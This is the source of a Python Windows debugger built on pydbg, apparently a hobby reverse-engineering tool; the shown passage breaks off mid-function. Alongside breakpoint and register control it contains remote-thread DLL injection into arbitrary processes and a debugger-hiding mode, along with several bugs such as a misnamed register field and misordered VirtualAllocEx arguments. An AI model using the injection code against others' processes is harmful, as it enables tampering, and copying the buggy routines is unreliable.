# encoding=utf8
# debugger.py
# Created by Starwarfan2099 on 6/4/2019

import utilities
import debuggerUtilities as dbgUtils
from pydbg import *
from pydbg.defines import *
from colorama import Fore
import pefile
import os
import struct
import psutil
import win32con
import win32api
import win32security
import win32file
import wmi
import pythoncom
import tempfile
import threading

utils = utilities.Utilities.getInstance()

class debugger:
    def __init__(self):
        self.processName = "pywindbg"
        self.dbg = pydbg()
        self.setupExeptionHandlers()
        self.verbose = False
        self.pidAttached = 0
        self.executableLoaded = False
        self.executablePath = ''
        self.pidLoaded = False
        self.debug = False

    def setVerbose(self, verbose):
        self.dbg.setVerbose(verbose)
        self.verbose = verbose
        return True

    def setDebug(self, debug):
        self.dbg.setDebug(debug)
        self.debug = debug
        return True

    def loadExecutable(self, path, processName):
        self.processName = processName
        self.executableLoaded = True
        self.executablePath = path
        self.dbg.load(path)
        return True

    def attachPID(self, pid):
        try:
            self.pidAttached = pid
            self.dbg.attach(pid)
            self.processName = self.dbg.enumerate_modules()[0][0]
            self.pidLoaded = True
            return True
        except:
            utils.dbgPrint("\n[-] Unable to attach to pid.\n", Fore.RED)
            return False

    def detach(self):
        utils.dbgPrint("\n[*] Detaching from process...\n", Fore.RED)
        self.processName = "pywindbg"
        try:
            self.dbg.detach()
        except:
            utils.dbgPrint("\n[-] Unable to detach, did the process crash?\n", Fore.RED)
        return True

    def continueRunning(self):
        utils.dbgPrint("")
        self.dbg.resume_all_threads()
        return True

    def run(self):
        self.getLibraries()
        self.dbg.run()                      # Wrapper for debug_event_loop()

    def enableHidden(self):
        utils.dbgPrint("[*] Debugger will be hidden after the first breakpoint is hit.", Fore.GREEN)
        self.dbg.setHidden(True)

    def disableHidden(self):
        utils.dbgPrint("\n[*] Debugger will  no longer be hidden.\n", Fore.GREEN)
        self.dbg.setHiddden(False)

    def processList(self, searchName=None):
        utils.dbgPrint("\n[+] Getting Process List...\n", Fore.GREEN)
        if searchName is None:
            for (pid, name) in self.dbg.enumerate_processes():
                if pid != os.getpid():
                    utils.dbgPrint("[+] Name: ", Fore.GREEN, dualline=True, secondline="%s PID:%s" % (name, pid))
                else:
                    utils.dbgPrint("[+] Name: %s PID:%s     <==[Current Debugger Process] " % (name, pid), Fore.GREEN)
        else:
            for (pid, name) in self.dbg.enumerate_processes():
                if searchName.lower() in name.lower() or searchName in str(pid):
                    if pid != os.getpid():
                        utils.dbgPrint("[+] Name: ", Fore.GREEN, dualline=True, secondline="%s PID:%s" % (name, pid))
                    else:
                        utils.dbgPrint("[+] Name: %s PID:%s     <==[Current Debugger Process] " % (name, pid), Fore.GREEN)
        utils.dbgPrint("")
        return True

    def pidInfo(self, pid):
        try:
            p = psutil.Process(pid)
        except psutil.NoSuchProcess:
            utils.dbgPrint("\n[-] Process with a PID of %d not found.\n" % pid, Fore.RED)
            return False
        except psutil.AccessDenied:
            utils.dbgPrint("\n[-] Process with a PID of %d could not be accesses.\n" % pid, Fore.RED)
            return False
        utils.dbgPrint("\n[*] Name: ", Fore.GREEN, dualline=True, secondline="%s" % p.name())
        utils.dbgPrint("[*] Executable path: ", Fore.GREEN, dualline=True, secondline="%s" % p.exe())
        utils.dbgPrint("[*] Working directory: ", Fore.GREEN, dualline=True, secondline="%s" % p.cwd())
        command = ""
        for item in p.cmdline():
            command = command + item + " "
        utils.dbgPrint("[*] Command line: ", Fore.GREEN, dualline=True, secondline="\"%s\"" % command.strip())
        utils.dbgPrint("[*] Process: ", Fore.GREEN, dualline=True, secondline="%d" % p.pid)
        utils.dbgPrint("[*] Parent PID: ", Fore.GREEN, dualline=True, secondline="%d" % p.ppid())
        utils.dbgPrint("[*] Status: ", Fore.GREEN, dualline=True, secondline="%s" % p.status())
        utils.dbgPrint("[*] Username: ", Fore.GREEN, dualline=True, secondline="%s" % p.username())
        utils.dbgPrint("[*] Process creation time: ", Fore.GREEN, dualline=True, secondline="%f" % p.create_time())
        utils.dbgPrint("[*] Threads: ", Fore.GREEN, dualline=True, secondline="%d\n" % p.num_threads())

    def parseBinaryInfo(self, info):
        for line in info.split("\n"):
            if "----------Base relocations----------" in line:
                return True
            elif "----------" in line:
                utils.dbgPrint(line, Fore.GREEN)
            elif ".dll" in line:
                utils.dbgPrint(line, Fore.BLUE)
            elif "Name:" in line:
                utils.dbgPrint(line, Fore.GREEN)
            elif "[" in line and "]" in line:
                utils.dbgPrint(line, Fore.YELLOW)
            elif "C:\\" in line:
                utils.dbgPrint(line, Fore.CYAN)
            else:
                utils.dbgPrint(line)

    def dumpInfo(self, command):
        if len(command.split()) == 1:
            if self.executableLoaded is True:
                try:
                    pe = pefile.PE(self.executablePath)
                    self.parseBinaryInfo(pe.dump_info())
                except WindowsError:
                    utils.dbgPrint("\n[-] Unable to find file %s\n" % command.split()[1], Fore.RED)
            elif self.pidLoaded is True:
                self.pidInfo(int(self.pidAttached))
            else:
                utils.dbgPrint("\n[-] No arguments supplied and nothing being debugged or attached.\n", Fore.RED)
        else:
            try:
                pid = int(command.split()[1])
                self.pidInfo(pid)
            except ValueError:
                try:
                    pe = pefile.PE(command.split()[1])
                    self.parseBinaryInfo(pe.dump_info())
                except WindowsError:
                    utils.dbgPrint("\n[-] Unable to find file %s\n" % command.split()[1], Fore.RED)

    def setupExeptionHandlers(self):

        def one(dbg):
            utils.dbgPrint("[*] - [0x1-> EXCEPTION_DEBUG_EVENT]", Fore.GREEN)
            return DBG_CONTINUE

        def two(dbg):
            utils.dbgPrint("[*] - [0x2-> CREATE_THREAD_DEBUG_EVENT]", Fore.GREEN)
            return DBG_CONTINUE

        def three(dbg):
            utils.dbgPrint("[*] - [0x3-> CREATE_PROCESS_DEBUG_EVENT]", Fore.GREEN)
            return DBG_CONTINUE

        def four(dbg):
            utils.dbgPrint("[*] - [0x4-> EXIT_THREAD_DEBUG_EVENT]", Fore.RED)
            return DBG_CONTINUE

        def five(dbg):
            utils.dbgPrint("[*] - [0x5-> EXIT_PROCESS_DEBUG_EVENT]", Fore.RED)
            return DBG_CONTINUE

        def six(dbg):
            last_dll = dbg.get_system_dll(-1)
            utils.dbgPrint("[*] - [0x6-> LOAD_DLL_DEBUG_EVENT] > 0x%08x %s" % (last_dll.base, last_dll.path), Fore.BLUE)
            return DBG_CONTINUE

        def seven(dbg):
            utils.dbgPrint("[*] - [0x7-> UNLOAD_DLL_DEBUG_EVENT]", Fore.GREEN)
            return DBG_CONTINUE

        def eight(dbg):
            utils.dbgPrint("[*] - [0x8-> OUTPUT_DEBUG_STRING_EVENT]", Fore.GREEN)
            return DBG_CONTINUE

        def nine(dbg):
            utils.dbgPrint("[*] - [0x9-> RIP_EVENT]", Fore.GREEN)
            return DBG_CONTINUE

        self.dbg.set_callback(EXCEPTION_DEBUG_EVENT, one)
        self.dbg.set_callback(CREATE_THREAD_DEBUG_EVENT, two)
        self.dbg.set_callback(CREATE_PROCESS_DEBUG_EVENT, three)
        self.dbg.set_callback(EXIT_THREAD_DEBUG_EVENT, four)
        self.dbg.set_callback(EXIT_PROCESS_DEBUG_EVENT, five)
        self.dbg.set_callback(LOAD_DLL_DEBUG_EVENT, six)
        self.dbg.set_callback(UNLOAD_DLL_DEBUG_EVENT, seven)
        self.dbg.set_callback(OUTPUT_DEBUG_STRING_EVENT, eight)
        self.dbg.set_callback(RIP_EVENT, nine)

    def getLibraries(self):
        first = True
        for modules in self.dbg.enumerate_modules():
            if first:
                utils.dbgPrint("[*] Executable > %s" % modules[0], Fore.GREEN)
                first = False
            else:
                utils.dbgPrint("[+] DLL Loaded(%s) > %s" % (modules[1], modules[0]), Fore.BLUE)
        return True

    def getDllFunctionAddress(self, function, library):
        try:
            address = self.dbg.func_resolve_debuggee(library, function)
        except:
            utils.dbgPrint("\n[-] Error reading memory, is debugger attached to a process?\n", Fore.RED)
            return False
        if address == 0:
            utils.dbgPrint("\n[-] %s not found in %s.dll or the dll was not found.\n" % (function, library), Fore.RED)
            return False
        else:
            utils.dbgPrint("\n[*] %s, %s.dll: 0x%08x - Breakpoint address: %s\n" % (function, library.strip(".dll"), address, address), Fore.GREEN)
            return address

    def softBreakpointSet(self, address):

        def defaultHandler(dbg):
            utils.dbgPrint("\n[+] Hit breakpoint at %s\n" % address, Fore.GREEN)
            pass

        self.dbg.bp_set(address, handler=defaultHandler)
        return True

    def softBreakpointSetFunction(self, function, library, functionPointer):
        address = self.getDllFunctionAddress(function, library)
        if address is False:
            return False
        self.dbg.bp_set(address, function, handler=functionPointer)
        return True

    def dumpContext(self):
        utils.dbgPrint("")
        context = self.dbg.dump_context().split("\n")
        for line in context:
            if "-> N/A" in line:
                utils.dbgPrint(line, utilities.N_A_color)
            elif "(heap)" in line:
                utils.dbgPrint(line, utilities.heap_color)
            elif "(stack)" in line:
                utils.dbgPrint(line, utilities.stack_color)
            else:
                utils.dbgPrint(line, Fore.GREEN)
        return True

    def dumpRegisters(self):
        for thread_id in self.dbg.enumerate_threads():
            thread_handle = self.dbg.open_thread(thread_id)
            context = self.dbg.get_thread_context(thread_handle)
            utils.dbgPrint("\n[*] Thread id: %d" % thread_id, Fore.GREEN)
            hexRegister = "%x" % context.Eip
            utils.dbgPrint("[*] EIP: 0x%08x, - Decimal: %d, ASCII: %s" % (context.Eip, context.Eip, hexRegister.decode("hex")), Fore.GREEN)
            hexRegister = "%x" % context.Esp
            utils.dbgPrint("[*] ESP: 0x%08x, - Decimal: %d, ASCII: %s" % (context.Esp, context.Esp, hexRegister.decode("hex")),Fore.GREEN)
            hexRegister = "%x" % context.Ebp
            utils.dbgPrint("[*] EBP: 0x%08x, - Decimal: %d, ASCII: %s" % (context.Ebp, context.Ebp, hexRegister.decode("hex")), Fore.GREEN)
            hexRegister = "%x" % context.Eax
            utils.dbgPrint("[*] EAX: 0x%08x, - Decimal: %d, ASCII: %s" % (context.Eax, context.Eax, hexRegister.decode("hex")), Fore.GREEN)
            hexRegister = "%x" % context.Ebx
            utils.dbgPrint("[*] EBX: 0x%08x, - Decimal: %d, ASCII: %s" % (context.Ebx, context.Ebx, hexRegister.decode("hex")), Fore.GREEN)
            hexRegister = "%x" % context.Ecx
            utils.dbgPrint("[*] ECX: 0x%08x, - Decimal: %d, ASCII: %s" % (context.Ecx, context.Ecx, hexRegister.decode("hex")), Fore.GREEN)
            hexRegister = "%x" % context.Eidx
            utils.dbgPrint("[*] EDX: 0x%08x, - Decimal: %d, ASCII: %s" % (context.Edx, context.Edx, hexRegister.decode("hex")), Fore.GREEN)
            return True

    def getRegister(self, register, thread=None):
        if thread is None:
            for thread_id in self.dbg.enumerate_threads():
                thread_handle = self.dbg.open_thread(thread_id)
                context = self.dbg.get_thread_context(thread_handle)
                if register == "EIP":
                    hexRegister = "%x" % context.Eip
                    utils.dbgPrint("[*] (Thread %d) EIP: 0x%08x, - Decimal: %d, ASCII: %s" % (thread_id, context.Eip, context.Eip, hexRegister.decode("hex")), Fore.GREEN)
                elif register == "ESP":
                    hexRegister = "%x" % context.Esp
                    utils.dbgPrint("[*] (Thread %d) ESP: 0x%08x, - Decimal: %d, ASCII: %s" % (thread_id, context.Esp, context.Esp, hexRegister.decode("hex")), Fore.GREEN)
                elif register == "EBP":
                    hexRegister = "%x" % context.Ebp
                    utils.dbgPrint("[*] (Thread %d) EBP: 0x%08x, - Decimal: %d, ASCII: %s" % (thread_id, context.Ebp, context.Ebp, hexRegister.decode("hex")), Fore.GREEN)
                elif register == "EAX":
                    hexRegister = "%x" % context.Eax
                    utils.dbgPrint("[*] (Thread %d) EAX: 0x%08x, - Decimal: %d, ASCII: %s" % (thread_id, context.Eax, context.Eax, hexRegister.decode("hex")), Fore.GREEN)
                elif register == "EBX":
                    hexRegister = "%x" % context.Ebx
                    utils.dbgPrint("[*] (Thread %d) EBX: 0x%08x, - Decimal: %d, ASCII: %s" % (thread_id, context.Ebx, context.Ebx, hexRegister.decode("hex")), Fore.GREEN)
                elif register == "ECX":
                    hexRegister = "%x" % context.Ecx
                    utils.dbgPrint("[*] (Thread %d) ECX: 0x%08x, - Decimal: %d, ASCII: %s" % (thread_id, context.Ecx, context.Ecx, hexRegister.decode("hex")), Fore.GREEN)
                elif register == "EDX":
                    hexRegister = "%x" % context.Edx
                    utils.dbgPrint("[*] (Thread %d) EDX: 0x%08x, - Decimal: %d, ASCII: %s" % (thread_id, context.Edx, context.Edx, hexRegister.decode("hex")), Fore.GREEN)
                else: return False
        else:
            for thread_id in self.dbg.enumerate_threads():
                if thread_id == thread:
                    thread_handle = self.dbg.open_thread(thread_id)
                    context = self.dbg.get_thread_context(thread_handle)
                    if register == "EIP": return context.Eip
                    elif register == "ESP": return context.Esp
                    elif register == "EBP": return context.Ebp
                    elif register == "EAX": return context.Eax
                    elif register == "EBX": return context.Ebx
                    elif register == "ECX": return context.Ecx
                    elif register == "EDX": return context.Edx
                    else: return False
                else: return False
        # self.dbg.resume_all_threads()

    def setRegister(self, register, value, thread=None):
        if thread is None:
            if register == "EAX":
                for thread_id in self.dbg.enumerate_threads():
                    thread_handle = self.dbg.open_thread(thread_id)
                    thread_context = self.dbg.get_thread_context(thread_handle)
                    thread_context.Eax = value
                    self.dbg.set_thread_context(thread_context, 0, thread_id)
                    thread_context = self.dbg.get_thread_context(thread_handle)
                    utils.dbgPrint("\n[+] (Thread %d) New EAX value: 0x%08x" % (thread_id, thread_context.Eax), Fore.GREEN)
                self.dbg.resume_all_threads()
            elif register == "EBX":
                for thread_id in self.dbg.enumerate_threads():
                    thread_handle = self.dbg.open_thread(thread_id)
                    thread_context = self.dbg.get_thread_context(thread_handle)
                    thread_context.Ebx = value
                    self.dbg.set_thread_context(thread_context, 0, thread_id)
                    thread_context = self.dbg.get_thread_context(thread_handle)
                    utils.dbgPrint("\n[+] (Thread %d) New EBX value: 0x%08x" % (thread_id, thread_context.Ebx), Fore.GREEN)
                self.dbg.resume_all_threads()
            elif register == "ECX":
                for thread_id in self.dbg.enumerate_threads():
                    thread_handle = self.dbg.open_thread(thread_id)
                    thread_context = self.dbg.get_thread_context(thread_handle)
                    thread_context.Ecx = value
                    self.dbg.set_thread_context(thread_context, 0, thread_id)
                    thread_context = self.dbg.get_thread_context(thread_handle)
                    utils.dbgPrint("\n[+] (Thread %d) New ECX value: 0x%08x" % (thread_id, thread_context.Ecx), Fore.GREEN)
                self.dbg.resume_all_threads()
            elif register == "EDX":
                for thread_id in self.dbg.enumerate_threads():
                    thread_handle = self.dbg.open_thread(thread_id)
                    thread_context = self.dbg.get_thread_context(thread_handle)
                    thread_context.Edx = value
                    self.dbg.set_thread_context(thread_context, 0, thread_id)
                    thread_context = self.dbg.get_thread_context(thread_handle)
                    utils.dbgPrint("\n[+] (Thread %d) New EDX value: 0x%08x" % (thread_id, thread_context.Edx), Fore.GREEN)
                self.dbg.resume_all_threads()
            elif register == "ESI":
                for thread_id in self.dbg.enumerate_threads():
                    thread_handle = self.dbg.open_thread(thread_id)
                    thread_context = self.dbg.get_thread_context(thread_handle)
                    thread_context.Esi = value
                    self.dbg.set_thread_context(thread_context, 0, thread_id)
                    thread_context = self.dbg.get_thread_context(thread_handle)
                    utils.dbgPrint("\n[+] (Thread %d) New ESI value: 0x%08x" % (thread_id, thread_context.Esi), Fore.GREEN)
                self.dbg.resume_all_threads()
            elif register == "EDI":
                for thread_id in self.dbg.enumerate_threads():
                    thread_handle = self.dbg.open_thread(thread_id)
                    thread_context = self.dbg.get_thread_context(thread_handle)
                    thread_context.Edi = value
                    self.dbg.set_thread_context(thread_context, 0, thread_id)
                    thread_context = self.dbg.get_thread_context(thread_handle)
                    utils.dbgPrint("\n[+] (Thread %d) New EDI value: 0x%08x" % (thread_id, thread_context.Edi), Fore.GREEN)
                self.dbg.resume_all_threads()
            elif register == "ESP":
                for thread_id in self.dbg.enumerate_threads():
                    thread_handle = self.dbg.open_thread(thread_id)
                    thread_context = self.dbg.get_thread_context(thread_handle)
                    thread_context.Esp = value
                    self.dbg.set_thread_context(thread_context, 0, thread_id)
                    thread_context = self.dbg.get_thread_context(thread_handle)
                    utils.dbgPrint("\n[+] (Thread %d) New ESP value: 0x%08x" % (thread_id, thread_context.Esp), Fore.GREEN)
                self.dbg.resume_all_threads()
            elif register == "EBP":
                for thread_id in self.dbg.enumerate_threads():
                    thread_handle = self.dbg.open_thread(thread_id)
                    thread_context = self.dbg.get_thread_context(thread_handle)
                    thread_context.Ebp = value
                    self.dbg.set_thread_context(thread_context, 0, thread_id)
                    thread_context = self.dbg.get_thread_context(thread_handle)
                    utils.dbgPrint("\n[+] (Thread %d) New EBP value: 0x%08x" % (thread_id, thread_context.Ebp), Fore.GREEN)
                self.dbg.resume_all_threads()
            elif register == "EIP":
                for thread_id in self.dbg.enumerate_threads():
                    thread_handle = self.dbg.open_thread(thread_id)
                    thread_context = self.dbg.get_thread_context(thread_handle)
                    thread_context.Eip = value
                    self.dbg.set_thread_context(thread_context, 0, thread_id)
                    thread_context = self.dbg.get_thread_context(thread_handle)
                    utils.dbgPrint("\n[+] (Thread %d) New EIP value: 0x%08x" % (thread_id, thread_context.Eip), Fore.GREEN)
                self.dbg.resume_all_threads()
            else:
                utils.dbgPrint("\n[-] Error, invalid register name chosen.", Fore.RED)
                return False
        else:
            if register == "EAX":
                for thread_id in self.dbg.enumerate_threads():
                    if thread_id == thread:
                        thread_handle = self.dbg.open_thread(thread_id)
                        thread_context = self.dbg.get_thread_context(thread_handle)
                        thread_context.Eax = value
                        self.dbg.set_thread_context(thread_context, 0, thread_id)
                        thread_context = self.dbg.get_thread_context(thread_handle)
                        utils.dbgPrint("\n[+] (Thread %d) New EAX value: 0x%08x" % (thread_id, thread_context.Eax), Fore.GREEN)
                self.dbg.resume_all_threads()
            elif register == "EBX":
                for thread_id in self.dbg.enumerate_threads():
                    if thread_id == thread:
                        thread_handle = self.dbg.open_thread(thread_id)
                        thread_context = self.dbg.get_thread_context(thread_handle)
                        thread_context.Ebx = value
                        self.dbg.set_thread_context(thread_context, 0, thread_id)
                        thread_context = self.dbg.get_thread_context(thread_handle)
                        utils.dbgPrint("\n[+] (Thread %d) New EBX value: 0x%08x" % (thread_id, thread_context.Ebx), Fore.GREEN)
                self.dbg.resume_all_threads()
            elif register == "ECX":
                for thread_id in self.dbg.enumerate_threads():
                    if thread_id == thread:
                        thread_handle = self.dbg.open_thread(thread_id)
                        thread_context = self.dbg.get_thread_context(thread_handle)
                        thread_context.Ecx = value
                        self.dbg.set_thread_context(thread_context, 0, thread_id)
                        thread_context = self.dbg.get_thread_context(thread_handle)
                        utils.dbgPrint("\n[+] (Thread %d) New ECX value: 0x%08x" % (thread_id, thread_context.Ecx), Fore.GREEN)
                self.dbg.resume_all_threads()
            elif register == "EDX":
                for thread_id in self.dbg.enumerate_threads():
                    if thread_id == thread:
                        thread_handle = self.dbg.open_thread(thread_id)
                        thread_context = self.dbg.get_thread_context(thread_handle)
                        thread_context.Edx = value
                        self.dbg.set_thread_context(thread_context, 0, thread_id)
                        thread_context = self.dbg.get_thread_context(thread_handle)
                        utils.dbgPrint("\n[+] (Thread %d) New EDX value: 0x%08x" % (thread_id, thread_context.Edx), Fore.GREEN)
                self.dbg.resume_all_threads()
            elif register == "ESI":
                for thread_id in self.dbg.enumerate_threads():
                    if thread_id == thread:
                        thread_handle = self.dbg.open_thread(thread_id)
                        thread_context = self.dbg.get_thread_context(thread_handle)
                        thread_context.Esi = value
                        self.dbg.set_thread_context(thread_context, 0, thread_id)
                        thread_context = self.dbg.get_thread_context(thread_handle)
                        utils.dbgPrint("\n[+] (Thread %d) New ESI value: 0x%08x" % (thread_id, thread_context.Esi), Fore.GREEN)
                self.dbg.resume_all_threads()
            elif register == "EDI":
                for thread_id in self.dbg.enumerate_threads():
                    if thread_id == thread:
                        thread_handle = self.dbg.open_thread(thread_id)
                        thread_context = self.dbg.get_thread_context(thread_handle)
                        thread_context.Edi = value
                        self.dbg.set_thread_context(thread_context, 0, thread_id)
                        thread_context = self.dbg.get_thread_context(thread_handle)
                        utils.dbgPrint("\n[+] (Thread %d) New EDI value: 0x%08x" % (thread_id, thread_context.Edi), Fore.GREEN)
                self.dbg.resume_all_threads()
            elif register == "ESP":
                for thread_id in self.dbg.enumerate_threads():
                    if thread_id == thread:
                        thread_handle = self.dbg.open_thread(thread_id)
                        thread_context = self.dbg.get_thread_context(thread_handle)
                        thread_context.Esp = value
                        self.dbg.set_thread_context(thread_context, 0, thread_id)
                        thread_context = self.dbg.get_thread_context(thread_handle)
                        utils.dbgPrint("\n[+] (Thread %d) New ESP value: 0x%08x" % (thread_id, thread_context.Esp), Fore.GREEN)
                self.dbg.resume_all_threads()
            elif register == "EBP":
                for thread_id in self.dbg.enumerate_threads():
                    if thread_id == thread:
                        thread_handle = self.dbg.open_thread(thread_id)
                        thread_context = self.dbg.get_thread_context(thread_handle)
                        thread_context.Ebp = value
                        self.dbg.set_thread_context(thread_context, 0, thread_id)
                        thread_context = self.dbg.get_thread_context(thread_handle)
                        utils.dbgPrint("\n[+] (Thread %d) New EBP value: 0x%08x" % (thread_id, thread_context.Ebp), Fore.GREEN)
                self.dbg.resume_all_threads()
            elif register == "EIP":
                for thread_id in self.dbg.enumerate_threads():
                    if thread_id == thread:
                        thread_handle = self.dbg.open_thread(thread_id)
                        thread_context = self.dbg.get_thread_context(thread_handle)
                        thread_context.Eip = value
                        self.dbg.set_thread_context(thread_context, 0, thread_id)
                        thread_context = self.dbg.get_thread_context(thread_handle)
                        utils.dbgPrint("\n[+] (Thread %d) New EIP value: 0x%08x" % (thread_id, thread_context.Eip), Fore.GREEN)
                self.dbg.resume_all_threads()
            else:
                utils.dbgPrint("\n[-] Error, invalid register name chosen.", Fore.RED)
                return False

    def enableCrashMode(self):
        def check_accessv(dbg):
            if dbg.dbg.u.Exception.dwFirstChance:
                return DBG_EXCEPTION_NOT_HANDLED
            crash_bin = dbgUtils.crash_binning.crash_binning()
            crash_bin.record_crash(dbg)
            crash = crash_bin.crash_synopsis().split("\n")
            for line in crash:
                if "-> N/A" in line:
                    utils.dbgPrint(line, utilities.N_A_color)
                elif "from thread" in line or "read from" in line:
                    utils.dbgPrint(line, Fore.GREEN)
                elif "(heap)" in line:
                    utils.dbgPrint(line, utilities.heap_color)
                elif "(stack)" in line:
                    utils.dbgPrint(line, utilities.stack_color)
                elif ".dll" in line:
                    utils.dbgPrint(line, Fore.BLUE)
                else:
                    utils.dbgPrint(line, Fore.GREEN)
            utils.dbgPrint("")
            dbg.terminate_process()
            return DBG_EXCEPTION_NOT_HANDLED

        self.dbg.set_callback(EXCEPTION_ACCESS_VIOLATION, check_accessv)

    def disableCrashMode(self):
        def doNothing(dbg):
            return DBG_EXCEPTION_HANDLED

        self.dbg.set_callback(EXCEPTION_ACCESS_VIOLATION, doNothing)

    def enableFileMode(self):
        def handler_CreateFileW(dbg):
            Filename = ""
            addr_FilePointer = self.dbg.read_process_memory(self.dbg.context.Esp + 0x4, 4)
            addr_FilePointer = struct.unpack("<L", addr_FilePointer)[0]
            Filename = self.dbg.smart_dereference(addr_FilePointer, True)
            utils.dbgPrint("[*]CreateFileW -> %s" % Filename, utilities.heap_color)
            return DBG_CONTINUE

        def handler_CreateFileA(dbg):
            offset = 0
            buffer_FileA = ""
            addr_FilePointer = self.dbg.read_process_memory(self.dbg.context.Esp + 0x4, 4)
            addr_FilePointer = struct.unpack("<L", addr_FilePointer)[0]
            buffer_FileA = self.dbg.smart_dereference(addr_FilePointer, True)
            utils.dbgPrint("[*]CreateFileA -> %s" % buffer_FileA, Fore.GREEN)
            return DBG_CONTINUE

        function2 = "CreateFileW"
        function3 = "CreateFileA"
        CreateFileW = self.dbg.func_resolve_debuggee("kernel32.dll", "CreateFileW")
        CreateFileA = self.dbg.func_resolve_debuggee("kernel32.dll", "CreateFileA")
        utils.dbgPrint("[*]Resolving %s @ %08x" % (function2, CreateFileW), Fore.GREEN)
        utils.dbgPrint("[*]Resolving %s @ Unknown" % (function2), Fore.GREEN)
        utils.dbgPrint("[*]Resolving %s @ %08x" % (function3, CreateFileA), Fore.GREEN)
        utils.dbgPrint("[*]Resolving %s @ Unknown" % (function2), Fore.GREEN)
        self.dbg.bp_set(CreateFileA, description="CreateFileA", handler=handler_CreateFileA)
        self.dbg.bp_set(CreateFileW, description="CreateFileW", handler=handler_CreateFileW)

    def disableFileMode(self):
        def doNothing(dbg):
            return DBG_EXCEPTION_HANDLED

        CreateFileW = self.dbg.func_resolve_debuggee("kernel32.dll", "CreateFileW")
        CreateFileA = self.dbg.func_resolve_debuggee("kernel32.dll", "CreateFileA")
        self.dbg.bp_set(CreateFileA, description="CreateFileA", handler=doNothing)
        self.dbg.bp_set(CreateFileW, description="CreateFileW", handler=doNothing)

    def dllInject2(self, pid, dll):
        kernel32 = windll.kernel32
        utils.dbgPrint("\n[*] Dll path: %s" % dll, Fore.BLUE)
        pageRWPriv = 0x04
        PROCESS_ALL_ACCESS = 0x1F0FFF
        virtualMemory = 0x3000
        dllLength = len(dll)
        utils.dbgPrint("[+] Getting process handle for PID: %d " % pid, Fore.GREEN)
        hProcess = kernel32.OpenProcess(PROCESS_ALL_ACCESS, False, pid)
        if hProcess is None:
            utils.dbgPrint("[-] Unable to get process handle.", Fore.RED)
            return False
        utils.dbgPrint("[+] Allocating space for DLL PATH.", Fore.GREEN)
        dllPathAddress = kernel32.VirtualAllocEx(hProcess,
                                                 dllLength,
                                                 0,
                                                 virtualMemory,
                                                 pageRWPriv)
        boolWritten = c_int(0)
        utils.dbgPrint("[+] Writing DLL PATH to current process space.", Fore.GREEN)
        kernel32.WriteProcessMemory(hProcess,
                                    dllPathAddress,
                                    dll,
                                    dllLength,
                                    byref(boolWritten))
        utils.dbgPrint("[+] Resolving Call Specific functions & libraries.", Fore.GREEN)
        kernel32DllHandler_addr = kernel32.GetModuleHandleA("kernel32")
        utils.dbgPrint("[+] Resolved kernel32 library at 0x%08x." % kernel32DllHandler_addr, Fore.GREEN, verbose=self.verbose)
        LoadLibraryA_func_addr = kernel32.GetProcAddress(kernel32DllHandler_addr, "LoadLibraryA")
        utils.dbgPrint("[+] Resolved LoadLibraryA function at 0x%08x." % LoadLibraryA_func_addr, Fore.GREEN, verbose=self.verbose)
        thread_id = c_ulong(0)
        utils.dbgPrint("[+] Creating Remote Thread to load our DLL.", Fore.GREEN)
        if not kernel32.CreateRemoteThread(hProcess,
                                           None,
                                           0,
                                           LoadLibraryA_func_addr,
                                           dllPathAddress,
                                           0,
                                           byref(thread_id)):
            error = kernel32.GetLastError()
            utils.dbgPrint("[-] Injection Failed, exiting with error code: %s." % error, Fore.RED)
            if error == "5" or error == 5:
                utils.dbgPrint("[-] Received error code 5, you are trying to inject into 32 bit process from a 64 bit or vice versa.\n", Fore.RED)
                return False
            elif error == "4":
                utils.dbgPrint("[-] Received error code 4, you are trying to inject into a different privileged process.\n", Fore.RED)
                return False
        else:
            error = kernel32.GetLastError()
            utils.dbgPrint("[+] Remote Thread 0x%08x created, DLL code injected with code: %s\n" % (thread_id.value, error), Fore.GREEN)
            return True

    def dllInject(self, pid, dll):
        utils.dbgPrint("")
        PAGE_READWRITE = 0x04
        PROCESS_ALL_ACCESS = (0x00F0000 | 0x00100000 | 0xFFF)
        VIRTUAL_MEM = (0x1000 | 0x2000)

        kernel32 = windll.kernel32
        dll_len = len(dll)

        # Get handle to process being injected...
        h_process = kernel32.OpenProcess(PROCESS_ALL_ACCESS, False, int(pid))

        if not h_process:
            utils.dbgPrint("\n[-] Couldn't get handle to PID: %s\n" % (pid), Fore.RED)
            return False

        # Allocate space for DLL path
        arg_address = kernel32.VirtualAllocEx(h_process, 0, dll_len, VIRTUAL_MEM, PAGE_READWRITE)

        # Write DLL path to allocated space
        written = c_int(0)
        kernel32.WriteProcessMemory(h_process, arg_address, dll, dll_len, byref(written))

        # Resolve LoadLibraryA Address
        h_kernel32 = kernel32.GetModuleHandleA("kernel32.dll")
        utils.dbgPrint("[+] Resolved kernel32 library at 0x%08x." % h_kernel32, Fore.GREEN, verbose=self.verbose)

        h_loadlib = kernel32.GetProcAddress(h_kernel32, "LoadLibraryA")
        utils.dbgPrint("[+] Resolved LoadLibraryA function at 0x%08x." % h_loadlib, Fore.GREEN, verbose=self.verbose)

        # Now we createRemoteThread with entrypoiny set to LoadLibraryA and pointer to DLL path as param
        thread_id = c_ulong(0)

        if not kernel32.CreateRemoteThread(h_process, None, 0, h_loadlib, arg_address, 0, byref(thread_id)):
            utils.dbgPrint("[-] Failed to inject DLL.", Fore.RED)
            error = kernel32.GetLastError()
            utils.dbgPrint("[-] Injection Failed, exiting with error code: %s\n" % error, Fore.RED)
            return False

        utils.dbgPrint("[+] Remote Thread with ID 0x%08x created.\n" % (thread_id.value), Fore.GREEN)
        error = kernel32.GetLastError()
        utils.dbgPrint("[-] Last error code: %s\n" % error, Fore.RED, verbose=self.verbose)
        return True

    def getProcessPrivilages(self, pid):
        priv_list = []
        try:
            # obtain a handle to the target process
            hproc = win32api.OpenProcess(win32con.PROCESS_QUERY_INFORMATION, False, pid)

            # open the main process token
            htok = win32security.OpenProcessToken(hproc, win32con.TOKEN_QUERY)

            # retrieve the list of privileges enabled
            privs = win32security.GetTokenInformation(htok, win32security.TokenPrivileges)

            # iterate over privileges and output the ones that are enabled
            for priv_id, priv_flags in privs:
                # check if the privilege is enabled
                if priv_flags == 3:
                    priv_list.append(win32security.LookupPrivilegeName(None, priv_id))
        except:
            priv_list.append("N/A")
        return "|".join(priv_list)

    def processMonitor(self):
        try:
            pythoncom.CoInitialize()
            c = wmi.WMI()
            process_watcher = c.Win32_Process.watch_for("creation")
            while True:
                new_process = process_watcher()

                proc_owner = new_process.GetOwner()
                proc_owner = "%s\\%s" % (proc_owner[0], proc_owner[2])
                create_date = new_process.CreationDate
                executable = new_process.ExecutablePath
